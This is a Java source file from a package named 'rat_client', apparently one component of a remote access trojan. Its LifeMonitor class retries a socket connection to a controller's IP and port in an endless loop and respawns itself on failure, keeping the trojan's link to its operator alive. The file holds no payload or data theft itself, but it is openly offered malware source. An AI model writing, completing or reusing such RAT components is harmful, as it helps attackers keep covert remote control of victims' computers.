package rat_client;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.Socket;

public class LifeMonitor implements Runnable
{
    private Socket socket;
    private String ip_address;
    private int port;

    public LifeMonitor(String ip_address,int port)
    {
        this.ip_address=ip_address;
        this.port=port;
        Thread thread=new Thread(this);
        thread.start();
    }
    
    private void createLifeControlConnection()
    {
        System.out.println("Linked");
        try
        {
            socket=new Socket(ip_address,port);
            ObjectInputStream ois=new ObjectInputStream(socket.getInputStream());
            while(true)
                ois.readUTF();
        }
        catch(IOException exc)
        {
            exc.printStackTrace();
            Thread thread=new Thread(this);
            thread.start();
        }
    }
    
    @Override
    public void run()
    {
        while(true)
          try
          {
              socket=new Socket(ip_address,port);
              createLifeControlConnection();
              return;
          }
          catch(IOException exc)
          {
            
          }
    }
}
